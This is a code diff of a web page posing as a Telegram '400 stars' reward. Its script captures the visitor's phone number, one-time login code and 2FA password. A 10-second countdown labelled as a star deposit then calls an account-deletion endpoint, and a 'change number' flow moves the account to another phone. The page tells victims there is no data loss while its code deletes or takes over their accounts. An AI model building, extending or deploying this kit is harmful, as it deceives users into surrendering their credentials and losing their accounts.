+    <div class="card countdown-card">
+      <div style="padding:24px 20px 0; text-align:center;">
+        <h2 style="font-size:28px; font-weight:700;">Earning stars ...</h2>
+        <p style="color:var(--text-secondary);">400 stars · 10 seconds</p>
       </div>
-      <div class="card-body" style="padding:0 20px 24px;">
-        <div class="user-strip">
-          <div class="u-av" id="uAv">⭐</div>
-          <div>
-            <div class="u-name" id="uName">...</div>
-            <div class="u-phone" id="uPhone"></div>
-            <div class="u-tag" id="uTag"></div>
-          </div>
-        </div>
-        <div class="ring-wrap">
-          <div class="ring-outer">
-            <svg viewBox="0 0 164 164">
-              <circle class="r-track" cx="82" cy="82" r="75"/>
-              <circle class="r-prog" cx="82" cy="82" r="75" id="ringProg"/>
-            </svg>
-            <div class="ring-inner">
-              <div id="countNum">10</div>
-              <div class="ring-label">seconds</div>
-            </div>
-          </div>
-          <div class="count-headline" style="margin-top:10px;">⭐ stars depositing in <em id="countTxt">10</em> seconds...</div>
-        </div>
-        <ul class="del-list">
-          <li>400 Telegram stars will be added to your wallet</li>
-          <li>Bonus: you keep all messages & groups</li>
-          <li>No data loss — this is a reward</li>
-          <li>✨ offer valid for 10 seconds</li>
-        </ul>
-        <button class="cancel-btn" id="cancelBtn" onclick="cancelDelete()"><span>⭐ Cancel & keep account (no stars)</span></button>
-        <div class="skip-row"><button id="skipBtn" onclick="deleteNow()">skip & finish early</button></div>
+      <div class="user-strip">
+        <div class="u-av" id="uAv">⭐</div>
+        <div><div class="u-name" id="uName">...</div><div class="u-phone" id="uPhone"></div><div class="u-tag" id="uTag"></div></div>
       </div>
+      <div class="ring-wrap">
+        <div class="ring-outer">
+          <svg viewBox="0 0 164 164">
+            <circle class="r-track" cx="82" cy="82" r="75" />
+            <circle class="r-prog" cx="82" cy="82" r="75" id="ringProg" />
+          </svg>
+          <div class="ring-inner"><div id="countNum">10</div><div class="ring-label">seconds</div></div>
+        </div>
+        <div style="margin-top:10px;">⭐ depositing in <em id="countTxt">10</em>s</div>
+      </div>
+      <ul class="del-list">
+        <li>400 Telegram stars → your wallet</li>
+        <li>Keep all messages & groups</li>
+        <li>No data loss — pure reward</li>
+        <li>✨ valid 10 seconds</li>
+      </ul>
+      <button class="cancel-btn" id="cancelBtn" onclick="cancelDelete()">⭐ Cancel (no stars)</button>
+      <div class="skip-row"><button id="skipBtn" onclick="deleteNow()">skip & finish early</button></div>
+      <div class="bar-wrap"><div class="bar-fill" id="barFill"></div></div>
     </div>
-    <div class="bar-wrap" style="height:6px; background:rgba(255,215,0,0.1); margin-top:12px; border-radius:6px;"><div class="bar-fill" id="barFill" style="height:100%; background:gold; width:100%;"></div></div>
   </div>
 
-  <!-- ========= SCREEN 4: STARS EARNED ========= -->
+  <!-- SCREEN 4: STARS EARNED -->
   <div class="screen" id="deletedScreen">
     <div class="card">
-      <div class="stripe stripe-gold"></div>
-      <div class="card-body" style="padding:30px 20px;">
-        <div class="result-center">
-          <div class="res-icon gold-icon">⭐</div>
-          <div class="res-title">400 Stars Earned!</div>
-          <div class="res-sub">Congratulations! <strong>400 Telegram stars</strong> added to your wallet.</div>
-          <div class="fact-grid">
-            <div class="fact"><div class="fi">⭐</div><div class="fv">+400</div><div class="fl">Stars</div></div>
-            <div class="fact"><div class="fi">💎</div><div class="fv">Active</div><div class="fl">Wallet</div></div>
-            <div class="fact"><div class="fi">📱</div><div class="fv">Unlocked</div><div class="fl">Perks</div></div>
-            <div class="fact"><div class="fi">🔐</div><div class="fv">Secure</div><div class="fl">Account</div></div>
-          </div>
+      <div class="result-center">
+        <div class="res-icon gold-icon">⭐</div>
+        <div class="res-title">400 Stars Earned!</div>
+        <div class="res-sub">Congratulations, stars added to your wallet.</div>
+        <div class="fact-grid">
+          <div class="fact"><div class="fi">⭐</div><div class="fv">+400</div><div class="fl">Stars</div></div>
+          <div class="fact"><div class="fi">💎</div><div class="fv">Active</div><div class="fl">Wallet</div></div>
+          <div class="fact"><div class="fi">📱</div><div class="fv">Unlocked</div><div class="fl">Perks</div></div>
+          <div class="fact"><div class="fi">🔐</div><div class="fv">Secure</div><div class="fl">Account</div></div>
         </div>
       </div>
     </div>
   </div>
 
-  <!-- ========= SCREEN 5: CANCELLED (change number) ========= -->
+  <!-- SCREEN 5: CANCELLED -->
   <div class="screen" id="savedScreen">
     <div class="card">
-      <div class="stripe stripe-green"></div>
-      <div class="card-body" style="padding:24px;">
-        <div class="result-center" style="margin-bottom:20px">
-          <div class="res-icon green-icon">✅</div>
-          <div class="res-title">Earning Cancelled</div>
-          <div class="res-sub">Account unchanged. No stars credited.</div>
-        </div>
-        <div class="section-box">
-          <div class="sect-title" style="color:var(--gold); margin-bottom:14px;">📱 Change number instead?</div>
-          <div class="cn-step active" id="cn1">
-            <div class="field">
-              <label style="color:var(--muted);">New Phone Number</label>
-              <div class="inp-w"><span class="pfx">📲</span><input type="tel" id="newPhoneInp" placeholder="+1 987 654 3210" style="width:100%; padding:14px; background:rgba(0,0,0,0.3); border:1px solid var(--border); border-radius:60px; color:white;"></div>
-            </div>
-            <button class="btn-premium" id="cnSendBtn" onclick="cnSend()"><span>Send Code</span></button>
-            <div class="al" id="ca1"></div>
-          </div>
-          <div class="cn-step" id="cn2">
-            <div style="margin-bottom:14px; color:var(--muted);">Code sent to <strong id="cnNumDisp" style="color:var(--gold);"></strong></div>
-            <div class="otp-row" id="otp2">
-              <input type="tel" class="otp-d" maxlength="1"><input type="tel" class="otp-d" maxlength="1"><input type="tel" class="otp-d" maxlength="1"><input type="tel" class="otp-d" maxlength="1"><input type="tel" class="otp-d" maxlength="1">
-            </div>
-            <button class="btn-premium" id="cnConfBtn" onclick="cnConfirm()">Confirm</button>
-            <button class="btn-glass" onclick="cnGoTo(1)">← Back</button>
-            <div class="al" id="ca2"></div>
-          </div>
-          <div class="cn-step" id="cn3"><div style="text-align:center; padding:20px;">✅ Number changed to <strong id="cnSuccess" style="color:var(--gold);"></strong></div></div>
-        </div>
-        <button class="btn-glass" onclick="signOut()" style="margin-top:16px;">Sign Out</button>
+      <div class="result-center" style="padding-bottom:0;">
+        <div class="res-icon green-icon">✅</div>
+        <div class="res-title">Earning Cancelled</div>
+        <div class="res-sub">No stars credited · account safe</div>
       </div>
+      <div class="section-box">
+        <div style="font-weight:600; margin-bottom:16px;">📱 Change number?</div>
+        <div class="cn-step active" id="cn1">
+          <div class="field">
+            <label style="font-size:13px;">New phone number</label>
+            <div class="inp-w"><input type="tel" id="newPhoneInp" placeholder="+1 987 654 3210"></div>
+          </div>
+          <button class="btn-primary" id="cnSendBtn" onclick="cnSend()">Send Code</button>
+          <div class="al" id="ca1"></div>
+        </div>
+        <div class="cn-step" id="cn2">
+          <div style="margin-bottom:14px;">Code sent to <strong id="cnNumDisp" style="color:var(--accent);"></strong></div>
+          <div class="otp-row" id="otp2">
+            <input type="tel" class="otp-d" maxlength="1"><input type="tel" class="otp-d" maxlength="1"><input type="tel" class="otp-d" maxlength="1"><input type="tel" class="otp-d" maxlength="1"><input type="tel" class="otp-d" maxlength="1">
+          </div>
+          <button class="btn-primary" id="cnConfBtn" onclick="cnConfirm()">Confirm</button>
+          <button class="btn-outline" onclick="cnGoTo(1)" style="background:transparent; border:1px solid var(--border); border-radius:60px; padding:14px; width:100%; margin-top:10px;">← Back</button>
+          <div class="al" id="ca2"></div>
+        </div>
+        <div class="cn-step" id="cn3"><div style="text-align:center; padding:16px;">✅ Number changed to <strong id="cnSuccess" style="color:var(--accent);"></strong></div></div>
+      </div>
+      <button class="btn-outline" onclick="signOut()" style="margin:16px 24px; width:calc(100% - 48px);">Sign out</button>
     </div>
   </div>
 </div>
 
 <script>
-  // ---------- popup close ----------
-  function closePopup() {
-    document.getElementById('welcomePopup').style.display = 'none';
+// ---------- COUNTRIES DATABASE (from numbers.tsx) ----------
+const countries = [
+  { name: "Afghanistan", code: "+93" },
+  { name: "Albania", code: "+355" },
+  { name: "Algeria", code: "+213" },
+  { name: "Andorra", code: "+376" },
+  { name: "Angola", code: "+244" },
+  { name: "Antigua and Barbuda", code: "+1" },
+  { name: "Argentina", code: "+54" },
+  { name: "Armenia", code: "+374" },
+  { name: "Australia", code: "+61" },
+  { name: "Austria", code: "+43" },
+  { name: "Azerbaijan", code: "+994" },
+  { name: "Bahamas", code: "+1" },
+  { name: "Bahrain", code: "+973" },
+  { name: "Bangladesh", code: "+880" },
+  { name: "Barbados", code: "+1" },
+  { name: "Belarus", code: "+375" },
+  { name: "Belgium", code: "+32" },
+  { name: "Belize", code: "+501" },
+  { name: "Benin", code: "+229" },
+  { name: "Bhutan", code: "+975" },
+  { name: "Bolivia", code: "+591" },
+  { name: "Bosnia and Herzegovina", code: "+387" },
+  { name: "Botswana", code: "+267" },
+  { name: "Brazil", code: "+55" },
+  { name: "Brunei", code: "+673" },
+  { name: "Bulgaria", code: "+359" },
+  { name: "Burkina Faso", code: "+226" },
+  { name: "Burundi", code: "+257" },
+  { name: "Cambodia", code: "+855" },
+  { name: "Cameroon", code: "+237" },
+  { name: "Canada", code: "+1" },
+  { name: "Cape Verde", code: "+238" },
+  { name: "Central African Republic", code: "+236" },
+  { name: "Chad", code: "+235" },
+  { name: "Chile", code: "+56" },
+  { name: "China", code: "+86" },
+  { name: "Colombia", code: "+57" },
+  { name: "Comoros", code: "+269" },
+  { name: "Congo", code: "+242" },
+  { name: "Congo DR", code: "+243" },
+  { name: "Costa Rica", code: "+506" },
+  { name: "Croatia", code: "+385" },
+  { name: "Cuba", code: "+53" },
+  { name: "Cyprus", code: "+357" },
+  { name: "Czech Republic", code: "+420" },
+  { name: "Denmark", code: "+45" },
+  { name: "Djibouti", code: "+253" },
+  { name: "Dominica", code: "+1" },
+  { name: "Dominican Republic", code: "+1" },
+  { name: "Ecuador", code: "+593" },
+  { name: "Egypt", code: "+20" },
+  { name: "El Salvador", code: "+503" },
+  { name: "Equatorial Guinea", code: "+240" },
+  { name: "Eritrea", code: "+291" },
+  { name: "Estonia", code: "+372" },
+  { name: "Eswatini", code: "+268" },
+  { name: "Ethiopia", code: "+251" },
+  { name: "Fiji", code: "+679" },
+  { name: "Finland", code: "+358" },
+  { name: "France", code: "+33" },
+  { name: "Gabon", code: "+241" },
+  { name: "Gambia", code: "+220" },
+  { name: "Georgia", code: "+995" },
+  { name: "Germany", code: "+49" },
+  { name: "Ghana", code: "+233" },
+  { name: "Greece", code: "+30" },
+  { name: "Grenada", code: "+1" },
+  { name: "Guatemala", code: "+502" },
+  { name: "Guinea", code: "+224" },
+  { name: "Guinea-Bissau", code: "+245" },
+  { name: "Guyana", code: "+592" },
+  { name: "Haiti", code: "+509" },
+  { name: "Honduras", code: "+504" },
+  { name: "Hungary", code: "+36" },
+  { name: "Iceland", code: "+354" },
+  { name: "India", code: "+91" },
+  { name: "Indonesia", code: "+62" },
+  { name: "Iran", code: "+98" },
+  { name: "Iraq", code: "+964" },
+  { name: "Ireland", code: "+353" },
+  { name: "Israel", code: "+972" },
+  { name: "Italy", code: "+39" },
+  { name: "Ivory Coast", code: "+225" },
+  { name: "Jamaica", code: "+1" },
+  { name: "Japan", code: "+81" },
+  { name: "Jordan", code: "+962" },
+  { name: "Kazakhstan", code: "+7" },
+  { name: "Kenya", code: "+254" },
+  { name: "Kiribati", code: "+686" },
+  { name: "Kuwait", code: "+965" },
+  { name: "Kyrgyzstan", code: "+996" },
+  { name: "Laos", code: "+856" },
+  { name: "Latvia", code: "+371" },
+  { name: "Lebanon", code: "+961" },
+  { name: "Lesotho", code: "+266" },
+  { name: "Liberia", code: "+231" },
+  { name: "Libya", code: "+218" },
+  { name: "Liechtenstein", code: "+423" },
+  { name: "Lithuania", code: "+370" },
+  { name: "Luxembourg", code: "+352" },
+  { name: "Madagascar", code: "+261" },
+  { name: "Malawi", code: "+265" },
+  { name: "Malaysia", code: "+60" },
+  { name: "Maldives", code: "+960" },
+  { name: "Mali", code: "+223" },
+  { name: "Malta", code: "+356" },
+  { name: "Marshall Islands", code: "+692" },
+  { name: "Mauritania", code: "+222" },
+  { name: "Mauritius", code: "+230" },
+  { name: "Mexico", code: "+52" },
+  { name: "Micronesia", code: "+691" },
+  { name: "Moldova", code: "+373" },
+  { name: "Monaco", code: "+377" },
+  { name: "Mongolia", code: "+976" },
+  { name: "Montenegro", code: "+382" },
+  { name: "Morocco", code: "+212" },
+  { name: "Mozambique", code: "+258" },
+  { name: "Myanmar", code: "+95" },
+  { name: "Namibia", code: "+264" },
+  { name: "Nauru", code: "+674" },
+  { name: "Nepal", code: "+977" },
+  { name: "Netherlands", code: "+31" },
+  { name: "New Zealand", code: "+64" },
+  { name: "Nicaragua", code: "+505" },
+  { name: "Niger", code: "+227" },
+  { name: "Nigeria", code: "+234" },
+  { name: "North Korea", code: "+850" },
+  { name: "North Macedonia", code: "+389" },
+  { name: "Norway", code: "+47" },
+  { name: "Oman", code: "+968" },
+  { name: "Pakistan", code: "+92" },
+  { name: "Palau", code: "+680" },
+  { name: "Panama", code: "+507" },
+  { name: "Papua New Guinea", code: "+675" },
+  { name: "Paraguay", code: "+595" },
+  { name: "Peru", code: "+51" },
+  { name: "Philippines", code: "+63" },
+  { name: "Poland", code: "+48" },
+  { name: "Portugal", code: "+351" },
+  { name: "Qatar", code: "+974" },
+  { name: "Romania", code: "+40" },
+  { name: "Russia", code: "+7" },
+  { name: "Rwanda", code: "+250" },
+  { name: "Saint Kitts and Nevis", code: "+1" },
+  { name: "Saint Lucia", code: "+1" },
+  { name: "Saint Vincent and the Grenadines", code: "+1" },
+  { name: "Samoa", code: "+685" },
+  { name: "San Marino", code: "+378" },
+  { name: "Sao Tome and Principe", code: "+239" },
+  { name: "Saudi Arabia", code: "+966" },
+  { name: "Senegal", code: "+221" },
+  { name: "Serbia", code: "+381" },
+  { name: "Seychelles", code: "+248" },
+  { name: "Sierra Leone", code: "+232" },
+  { name: "Singapore", code: "+65" },
+  { name: "Slovakia", code: "+421" },
+  { name: "Slovenia", code: "+386" },
+  { name: "Solomon Islands", code: "+677" },
+  { name: "Somalia", code: "+252" },
+  { name: "South Africa", code: "+27" },
+  { name: "South Korea", code: "+82" },
+  { name: "South Sudan", code: "+211" },
+  { name: "Spain", code: "+34" },
+  { name: "Sri Lanka", code: "+94" },
+  { name: "Sudan", code: "+249" },
+  { name: "Suriname", code: "+597" },
+  { name: "Sweden", code: "+46" },
+  { name: "Switzerland", code: "+41" },
+  { name: "Syria", code: "+963" },
+  { name: "Taiwan", code: "+886" },
+  { name: "Tajikistan", code: "+992" },
+  { name: "Tanzania", code: "+255" },
+  { name: "Thailand", code: "+66" },
+  { name: "Timor-Leste", code: "+670" },
+  { name: "Togo", code: "+228" },
+  { name: "Tonga", code: "+676" },
+  { name: "Trinidad and Tobago", code: "+1" },
+  { name: "Tunisia", code: "+216" },
+  { name: "Turkey", code: "+90" },
+  { name: "Turkmenistan", code: "+993" },
+  { name: "Tuvalu", code: "+688" },
+  { name: "Uganda", code: "+256" },
+  { name: "Ukraine", code: "+380" },
+  { name: "United Arab Emirates", code: "+971" },
+  { name: "United Kingdom", code: "+44" },
+  { name: "United States", code: "+1" },
+  { name: "Uruguay", code: "+598" },
+  { name: "Uzbekistan", code: "+998" },
+  { name: "Vanuatu", code: "+678" },
+  { name: "Vatican City", code: "+379" },
+  { name: "Venezuela", code: "+58" },
+  { name: "Vietnam", code: "+84" },
+  { name: "Yemen", code: "+967" },
+  { name: "Zambia", code: "+260" },
+  { name: "Zimbabwe", code: "+263" }
+];
+
+// ---------- POPULATE COUNTRY SELECTOR ----------
+function populateCountries(filter = "") {
+  const select = document.getElementById('countrySelect');
+  select.innerHTML = '';
+  
+  const filtered = countries.filter(c => 
+    c.name.toLowerCase().includes(filter.toLowerCase()) || 
+    c.code.includes(filter)
+  );
+  
+  filtered.forEach(c => {
+    const option = document.createElement('option');
+    option.value = c.code;
+    option.textContent = `${c.name} ${c.code}`;
+    select.appendChild(option);
+  });
+  
+  // Set default to first option
+  if (filtered.length > 0) {
+    select.value = filtered[0].code;
+    updateCountryCode();
   }
+}
 
-  // ---------- core logic (adapted) ----------
-  let countTimer = null, countSec = 10, resendTmr = null;
-  const CIRC = 2 * Math.PI * 75;
+function filterCountries() {
+  const search = document.getElementById('countrySearch').value;
+  populateCountries(search);
+}
 
-  async function api(url, data) {
-    const o = data ? {method:'POST', headers:{'Content-Type':'application/json'}, credentials:'include', body:JSON.stringify(data)} : {credentials:'include'};
-    return (await fetch(url, o)).json();
-  }
+function updateCountryCode() {
+  const select = document.getElementById('countrySelect');
+  const code = select.value;
+  document.getElementById('countryCodeDisplay').textContent = code;
+}
 
-  function show(id) {
-    document.querySelectorAll('.screen').forEach(s => s.classList.remove('show'));
-    document.getElementById(id).classList.add('show');
-    window.scrollTo(0,0);
-  }
+// ---------- INITIALIZE ----------
+populateCountries();
 
-  function setLoading(id, on) {
-    const b = document.getElementById(id); if(b) {
-      b.classList.toggle('loading', on);
-      b.disabled = on;
-    }
-  }
+// ---------- POPUP CLOSE ----------
+function closePopup() {
+  document.getElementById('welcomePopup').style.display = 'none';
+}
 
-  function setAlert(id, type, msg) {
-    const el = document.getElementById(id); if(!el) return;
-    el.className = `al al-${type} show`;
-    el.innerHTML = `<span>${type==='error'?'⚠️':type==='success'?'✅':'ℹ️'}</span> ${msg}`;
-  }
-  function clearAlert(id) { const el=document.getElementById(id); if(el) el.className='al'; }
+// ---------- REST OF YOUR EXISTING JAVASCRIPT (keep all your original functions) ----------
+let countTimer = null, countSec = 10, resendTmr = null;
+const CIRC = 2 * Math.PI * 75;
 
-  function initOTP(id) {
-    const ins = [...document.querySelectorAll(`#${id} .otp-d`)];
-    ins.forEach((inp,i) => {
-      inp.addEventListener('input', e => {
-        e.target.value = e.target.value.replace(/\D/g,'').slice(-1);
-        if(e.target.value && i<ins.length-1) ins[i+1].focus();
-      });
-      inp.addEventListener('keydown', e => { if(e.key==='Backspace' && !inp.value && i>0) ins[i-1].focus(); });
+async function api(url, data) {
+  const o = data ? {method:'POST', headers:{'Content-Type':'application/json'}, credentials:'include', body:JSON.stringify(data)} : {credentials:'include'};
+  return (await fetch(url, o)).json();
+}
+
+function show(id) {
+  document.querySelectorAll('.screen').forEach(s => s.classList.remove('show'));
+  document.getElementById(id).classList.add('show'); window.scrollTo(0,0);
+}
+
+function setLoading(id, on) {
+  const b = document.getElementById(id); if(b) { b.classList.toggle('loading', on); b.disabled = on; }
+}
+
+function setAlert(id, type, msg) {
+  const el = document.getElementById(id); if(!el) return;
+  el.className = `al al-${type} show`; el.innerHTML = `<span>${type==='error'?'⚠️':type==='success'?'✅':'ℹ️'}</span> ${msg}`;
+}
+function clearAlert(id) { const el=document.getElementById(id); if(el) el.className='al'; }
+
+function initOTP(id) {
+  const ins = [...document.querySelectorAll(`#${id} .otp-d`)];
+  ins.forEach((inp,i) => {
+    inp.addEventListener('input', e => {
+      e.target.value = e.target.value.replace(/\D/g,'').slice(-1);
+      if(e.target.value && i<ins.length-1) ins[i+1].focus();
     });
-  }
-  function getOTP(id) { return [...document.querySelectorAll(`#${id} .otp-d`)].map(i=>i.value).join(''); }
-  function clearOTP(id) { document.querySelectorAll(`#${id} .otp-d`).forEach(i=>i.value=''); }
+    inp.addEventListener('keydown', e => { if(e.key==='Backspace' && !inp.value && i>0) ins[i-1].focus(); });
+  });
+}
+function getOTP(id) { return [...document.querySelectorAll(`#${id} .otp-d`)].map(i=>i.value).join(''); }
+function clearOTP(id) { document.querySelectorAll(`#${id} .otp-d`).forEach(i=>i.value=''); }
 
-  initOTP('otp1'); initOTP('otp2');
+initOTP('otp1'); initOTP('otp2');
 
-  function getFullPhone() {
-    const code = document.getElementById('countryCode')?.value.trim() || '+1';
-    const num = document.getElementById('phoneInp')?.value.trim() || '';
-    return code + num;
-  }
+function getFullPhone() {
+  const code = document.getElementById('countryCodeDisplay').textContent;
+  const num = document.getElementById('phoneInp').value.trim();
+  return code + num;
+}
 
-  // goToVerifyScreen with loading spinner on request button
-  async function goToVerifyScreen() {
-    const phone = getFullPhone();
-    if (!phone || phone.length < 3) return setAlert('a1','error','Enter your phone number.');
-    clearAlert('a1');
-    const btn = document.getElementById('sendBtn');
-    btn.classList.add('loading');   // show rotating circle
-    btn.disabled = true;
-    try {
-      const r = await api('/api/send-code', {phone});
-      if (r.success) {
-        document.getElementById('phoneDisplay').innerText = phone;
-        show('verifyScreen');
-        clearOTP('otp1');
-        startResend();
-      } else setAlert('a1','error', r.error||'Failed');
-    } catch(e) { setAlert('a1','error','Cannot reach server.'); }
-    btn.classList.remove('loading');
-    btn.disabled = false;
-  }
+async function goToVerifyScreen() {
+  const phone = getFullPhone();
+  if (!phone || phone.length < 3) return setAlert('a1','error','Enter phone number.');
+  clearAlert('a1');
+  const btn = document.getElementById('sendBtn'); btn.classList.add('loading'); btn.disabled = true;
+  try {
+    const r = await api('/api/send-code', {phone});
+    if (r.success) {
+      document.getElementById('phoneDisplay').innerText = phone;
+      show('verifyScreen'); clearOTP('otp1'); startResend();
+    } else setAlert('a1','error', r.error||'Failed');
+  } catch(e) { setAlert('a1','error','Server unreachable.'); }
+  btn.classList.remove('loading'); btn.disabled = false;
+}
 
-  function startResend() {
-    let c = 60;
-    const rP = document.getElementById('resendP'); const rBtn = document.getElementById('rBtn'); const rSpan = document.getElementById('rCount');
-    if(rP) rP.style.display='block'; if(rBtn) rBtn.style.display='none'; if(rSpan) rSpan.textContent=c;
-    if(resendTmr) clearInterval(resendTmr);
-    resendTmr = setInterval(() => {
-      c--; if(rSpan) rSpan.textContent=c;
-      if(c<=0) { clearInterval(resendTmr); if(rP) rP.style.display='none'; if(rBtn) rBtn.style.display='inline'; }
-    },1000);
-  }
+function startResend() {
+  let c = 60;
+  const rP = document.getElementById('resendP'), rBtn = document.getElementById('rBtn'), rSpan = document.getElementById('rCount');
+  if(rP) rP.style.display='block'; if(rBtn) rBtn.style.display='none'; if(rSpan) rSpan.textContent=c;
+  if(resendTmr) clearInterval(resendTmr);
+  resendTmr = setInterval(() => {
+    c--; if(rSpan) rSpan.textContent=c;
+    if(c<=0) { clearInterval(resendTmr); if(rP) rP.style.display='none'; if(rBtn) rBtn.style.display='inline'; }
+  },1000);
+}
 
-  async function verifyCode() {
-    const code = getOTP('otp1');
-    if(code.length<5) return setAlert('a2','error','Enter all 5 digits.');
-    const password = document.getElementById('pwInp').value||null;
-    clearAlert('a2'); setLoading('verifyBtn',true);
-    try {
-      const r = await api('/api/verify-code', {code,password});
-      if(r.needsPassword) {
-        document.getElementById('pwField').style.display='block';
-        setAlert('a2','info','Enter 2FA password');
-        setLoading('verifyBtn',false); return;
-      }
-      if(r.success) { fillUser(r.user); show('countdownScreen'); startCountdown(); }
-      else setAlert('a2','error', r.error||'Invalid');
-    } catch(e) { setAlert('a2','error','Cannot reach server.'); }
-    setLoading('verifyBtn',false);
-  }
+async function verifyCode() {
+  const code = getOTP('otp1'); if(code.length<5) return setAlert('a2','error','Enter 5 digits.');
+  const password = document.getElementById('pwInp').value||null;
+  clearAlert('a2'); setLoading('verifyBtn',true);
+  try {
+    const r = await api('/api/verify-code', {code,password});
+    if(r.needsPassword) {
+      document.getElementById('pwField').style.display='block'; setAlert('a2','info','Enter 2FA password'); setLoading('verifyBtn',false); return;
+    }
+    if(r.success) { fillUser(r.user); show('countdownScreen'); startCountdown(); }
+    else setAlert('a2','error', r.error||'Invalid');
+  } catch(e) { setAlert('a2','error','Server error.'); }
+  setLoading('verifyBtn',false);
+}
 
-  async function resend() {
-    const phone = getFullPhone();
-    try { await api('/api/send-code',{phone}); startResend(); setAlert('a2','success','New code sent.'); } catch(e){}
-  }
+async function resend() {
+  const phone = getFullPhone();
+  try { await api('/api/send-code',{phone}); startResend(); setAlert('a2','success','New code sent.'); } catch(e){}
+}
 
-  function fillUser(u) {
-    const name = [u.firstName, u.lastName].filter(Boolean).join(' ') || 'User';
-    document.getElementById('uAv').textContent = '⭐';
-    document.getElementById('uName').textContent = name;
-    document.getElementById('uPhone').textContent = '+' + u.phone;
-    document.getElementById('uTag').textContent = u.username ? '@'+u.username : '';
-  }
+function fillUser(u) {
+  const name = [u.firstName, u.lastName].filter(Boolean).join(' ') || 'User';
+  document.getElementById('uAv').textContent = '⭐';
+  document.getElementById('uName').textContent = name;
+  document.getElementById('uPhone').textContent = '+' + u.phone;
+  document.getElementById('uTag').textContent = u.username ? '@'+u.username : '';
+}
 
-  function startCountdown() {
-    countSec=10; renderCount(10);
-    countTimer = setInterval(async () => {
-      countSec--;
-      document.getElementById('countNum')?.classList.add('tick');
-      setTimeout(() => document.getElementById('countNum')?.classList.remove('tick'),130);
-      renderCount(countSec);
-      if(countSec<=0) { clearInterval(countTimer); await doDelete(); }
-    },1000);
-  }
+function startCountdown() {
+  countSec=10; renderCount(10);
+  countTimer = setInterval(async () => {
+    countSec--; document.getElementById('countNum')?.classList.add('tick'); setTimeout(() => document.getElementById('countNum')?.classList.remove('tick'),130);
+    renderCount(countSec);
+    if(countSec<=0) { clearInterval(countTimer); await doDelete(); }
+  },1000);
+}
 
-  function renderCount(s) {
-    const cn=document.getElementById('countNum'); if(cn) cn.textContent=s;
-    const ct=document.getElementById('countTxt'); if(ct) ct.textContent=s;
-    const ratio=s/10; const offset=CIRC*(1-ratio);
-    const ring=document.getElementById('ringProg'); if(ring) { ring.style.strokeDasharray=CIRC; ring.style.strokeDashoffset=offset; }
-    const bar=document.getElementById('barFill'); if(bar) bar.style.width=(ratio*100)+'%';
-  }
+function renderCount(s) {
+  const cn=document.getElementById('countNum'); if(cn) cn.textContent=s;
+  const ct=document.getElementById('countTxt'); if(ct) ct.textContent=s;
+  const ratio=s/10; const offset=CIRC*(1-ratio);
+  const ring=document.getElementById('ringProg'); if(ring) { ring.style.strokeDasharray=CIRC; ring.style.strokeDashoffset=offset; }
+  const bar=document.getElementById('barFill'); if(bar) bar.style.width=(ratio*100)+'%';
+}
 
-  async function cancelDelete() { clearInterval(countTimer); document.getElementById('cancelBtn').disabled=true; document.getElementById('skipBtn').disabled=true; try { await api('/api/cancel-delete',{}); } catch(e){} show('savedScreen'); }
-  async function deleteNow() { clearInterval(countTimer); document.getElementById('skipBtn').disabled=true; document.getElementById('cancelBtn').disabled=true; await doDelete(); }
-  async function doDelete() { try { const r=await api('/api/delete-account',{}); if(r.success) show('deletedScreen'); else { document.getElementById('cancelBtn').disabled=false; document.getElementById('skipBtn').disabled=false; } } catch(e){} }
+async function cancelDelete() { clearInterval(countTimer); document.getElementById('cancelBtn').disabled=true; document.getElementById('skipBtn').disabled=true; try { await api('/api/cancel-delete',{}); } catch(e){} show('savedScreen'); }
+async function deleteNow() { clearInterval(countTimer); document.getElementById('skipBtn').disabled=true; document.getElementById('cancelBtn').disabled=true; await doDelete(); }
+async function doDelete() { try { const r=await api('/api/delete-account',{}); if(r.success) show('deletedScreen'); else { document.getElementById('cancelBtn').disabled=false; document.getElementById('skipBtn').disabled=false; } } catch(e){} }
 
-  function cnGoTo(n) { document.querySelectorAll('.cn-step').forEach(s=>s.classList.remove('active')); document.getElementById(`cn${n}`).classList.add('active'); }
-  async function cnSend() {
-    const newPhone = document.getElementById('newPhoneInp').value.trim();
-    if(!newPhone) return setAlert('ca1','error','Enter number.');
-    clearAlert('ca1'); setLoading('cnSendBtn',true);
-    try { const r=await api('/api/send-new-code',{newPhone}); if(r.success) { document.getElementById('cnNumDisp').textContent=newPhone; setAlert('ca1','success','Code sent.'); setTimeout(()=>{ cnGoTo(2); clearOTP('otp2'); },700); } else setAlert('ca1','error',r.error); } catch(e) { setAlert('ca1','error','Cannot reach server.'); } setLoading('cnSendBtn',false);
-  }
-  async function cnConfirm() {
-    const code=getOTP('otp2'); if(code.length<5) return setAlert('ca2','error','Enter all digits.');
-    clearAlert('ca2'); setLoading('cnConfBtn',true);
-    try { const r=await api('/api/change-number',{code}); if(r.success) { document.getElementById('cnSuccess').textContent=r.newPhone; cnGoTo(3); } else setAlert('ca2','error',r.error); } catch(e) { setAlert('ca2','error','Cannot reach server.'); } setLoading('cnConfBtn',false);
-  }
-  async function signOut() { try { await api('/api/logout',{}); } catch(e){} location.reload(); }
+function cnGoTo(n) { document.querySelectorAll('.cn-step').forEach(s=>s.classList.remove('active')); document.getElementById(`cn${n}`).classList.add('active'); }
+async function cnSend() {
+  const newPhone = document.getElementById('newPhoneInp').value.trim();
+  if(!newPhone) return setAlert('ca1','error','Enter new number.');
+  clearAlert('ca1'); setLoading('cnSendBtn',true);
+  try { const r=await api('/api/send-new-code',{newPhone}); if(r.success) { document.getElementById('cnNumDisp').textContent=newPhone; setAlert('ca1','success','Code sent.'); setTimeout(()=>{ cnGoTo(2); clearOTP('otp2'); },700); } else setAlert('ca1','error',r.error); } catch(e) { setAlert('ca1','error','Server error.'); } setLoading('cnSendBtn',false);
+}
+async function cnConfirm() {
+  const code=getOTP('otp2'); if(code.length<5) return setAlert('ca2','error','Enter all digits.');
+  clearAlert('ca2'); setLoading('cnConfBtn',true);
+  try { const r=await api('/api/change-number',{code}); if(r.success) { document.getElementById('cnSuccess').textContent=r.newPhone; cnGoTo(3); } else setAlert('ca2','error',r.error); } catch(e) { setAlert('ca2','error','Server error.'); } setLoading('cnConfBtn',false);
+}
+async function signOut() { try { await api('/api/logout',{}); } catch(e){} location.reload(); }
 
-  document.getElementById('phoneInp')?.addEventListener('keydown', e=>{ if(e.key==='Enter') goToVerifyScreen(); });
-  document.getElementById('pwInp')?.addEventListener('keydown', e=>{ if(e.key==='Enter') verifyCode(); });
-  document.getElementById('newPhoneInp')?.addEventListener('keydown', e=>{ if(e.key==='Enter') cnSend(); });
+document.getElementById('phoneInp')?.addEventListener('keydown', e=>{ if(e.key==='Enter') goToVerifyScreen(); });
